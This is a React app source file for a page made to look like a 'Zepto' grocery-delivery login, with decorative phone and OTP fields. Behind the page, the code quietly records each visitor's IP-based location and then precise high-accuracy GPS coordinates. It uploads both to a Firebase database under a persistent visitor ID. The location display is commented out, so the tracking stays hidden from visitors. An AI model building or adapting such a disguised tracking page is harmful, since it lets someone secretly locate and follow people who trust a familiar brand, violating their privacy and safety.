import React, { useEffect, useState } from "react";
import { database } from "./firebase";
import { ref, set, get, update } from "firebase/database";
import { v4 as uuidv4 } from "uuid";

function App() {
  const [location, setLocation] = useState(null);
  const [userID, setUserID] = useState(null);
  const [loading, setLoading] = useState(true);
  const [gpsDenied, setGpsDenied] = useState(false);

  useEffect(() => {
    initializeUserID(); // Ensure UserID is generated
  }, []);

  // 📌 Step 1: Generate or Retrieve User ID
  const initializeUserID = async () => {
    let storedUserID = localStorage.getItem("userID");
    if (!storedUserID) {
      storedUserID = uuidv4(); // Generate unique ID
      localStorage.setItem("userID", storedUserID);
    }
    setUserID(storedUserID);
    console.log("✅ UserID:", storedUserID);

    getIPLocation(storedUserID);
  };

  // 📌 Step 2: Get IP Location - Always Fetch New Data
  const getIPLocation = async (userID) => {
    try {
      console.log("📌 Fetching fresh IP-based location...");
      const response = await fetch(`https://ip-api.com/json?timestamp=${Date.now()}`);
      if (!response.ok) throw new Error("Failed to fetch IP location");

      const data = await response.json();
      console.log("✅ IP Location Data:", data);

      const ipLocationData = {
        latitude: data.lat,
        longitude: data.lon,
        city: data.city,
        country: data.country,
        timestamp: new Date().toISOString(),
        method: "IP",
      };

      setLocation(ipLocationData);
      await saveLocation(userID, "ipLocation", ipLocationData);

      console.log("📌 IP location saved. Now requesting GPS location...");
      requestGPSLocation(userID);
    } catch (err) {
      console.error("❌ IP Geolocation failed:", err);
      requestGPSLocation(userID);
    }
  };

  // 📌 Step 3: Request GPS Location Permission Again (Even if Previously Blocked)
  const requestGPSLocation = (userID) => {
    console.log("📌 Checking GPS location permission...");
    if ("permissions" in navigator) {
      navigator.permissions
        .query({ name: "geolocation" })
        .then((permission) => {
          if (permission.state === "granted" || permission.state === "prompt") {
            console.log("✅ GPS permission granted. Fetching GPS...");
            getGPSLocation(userID);
          } else {
            console.warn("❌ GPS Permission Denied.");
            setGpsDenied(true);
          }
        })
        .catch(() => {
          console.warn("⚠️ Permission API failed, trying GPS...");
          getGPSLocation(userID);
        });
    } else {
      console.warn("⚠️ Permission API not supported, trying GPS...");
      getGPSLocation(userID);
    }
  };

  // 📌 Step 4: Get Precise GPS Location Every Visit
  const getGPSLocation = (userID) => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;

          const gpsLocationData = {
            latitude,
            longitude,
            timestamp: new Date().toISOString(),
            method: "GPS",
          };

          setLocation(gpsLocationData);
          saveLocation(userID, "gpsLocation", gpsLocationData);
          setLoading(false);
        },
        (error) => {
          console.warn("❌ GPS failed:", error);
          setGpsDenied(true);
          setLoading(false);
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    } else {
      console.error("❌ Geolocation not supported");
    }
  };

  // 📌 Step 5: Save Location (IP/GPS) to Firebase under the same userID
  const saveLocation = async (userID, type, locationData) => {
    const locationRef = ref(database, `userLocations/${userID}/${type}`);
    await update(locationRef, locationData);
    console.log(`✅ ${type} updated in Firebase:`, locationData);
  };

  return (
    <div
      style={{
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        height: "100vh",
        backgroundColor: "#f0f2f5",
        fontFamily: "Arial, sans-serif",
      }}
    >
      <div
        style={{
          textAlign: "center",
          width: "90%",
          maxWidth: "400px",
          backgroundColor: "white",
          padding: "20px",
          borderRadius: "8px",
          boxShadow: "0px 4px 10px rgba(0,0,0,0.1)",
        }}
      >
        <h1 style={{ color: "#2A2E43", fontSize: "32px", fontWeight: "bold" }}>
          Zepto
        </h1>
        <p style={{ color: "#606770", fontSize: "16px" }}>
          Fast & seamless grocery delivery
        </p>

        <input
          type="text"
          placeholder="Enter Mobile Number"
          style={{
            width: "100%",
            padding: "12px",
            margin: "10px 0",
            borderRadius: "6px",
            border: "1px solid #ddd",
            fontSize: "16px",
          }}
        />
        <input
          type="password"
          placeholder="Enter OTP"
          style={{
            width: "100%",
            padding: "12px",
            margin: "10px 0",
            borderRadius: "6px",
            border: "1px solid #ddd",
            fontSize: "16px",
          }}
        />
        <button
          style={{
            width: "100%",
            padding: "12px",
            backgroundColor: "#FF4C3B",
            color: "white",
            fontSize: "16px",
            fontWeight: "bold",
            border: "none",
            borderRadius: "6px",
            cursor: "pointer",
            marginTop: "10px",
          }}
        >
          Log In
        </button>

        {/* Location Information */}
        {/* <div style={{ marginTop: "20px", fontSize: "14px", color: "#606770" }}>
          {loading ? (
            <p>Fetching location...</p>
          ) : location ? (
            <div>
              <p>Latitude: {location.latitude}</p>
              <p>Longitude: {location.longitude}</p>
              {location.city && <p>City: {location.city}</p>}
              {location.country && <p>Country: {location.country}</p>}
              <p>Method: {location.method}</p>
            </div>
          ) : gpsDenied ? (
            <p style={{ color: "red", fontWeight: "bold" }}>
              GPS is blocked. Please enable location services or refresh the page.
            </p>
          ) : (
            <p>Could not retrieve location</p>
          )}
        </div> */}
      </div>
    </div>
  );
}

export default App;
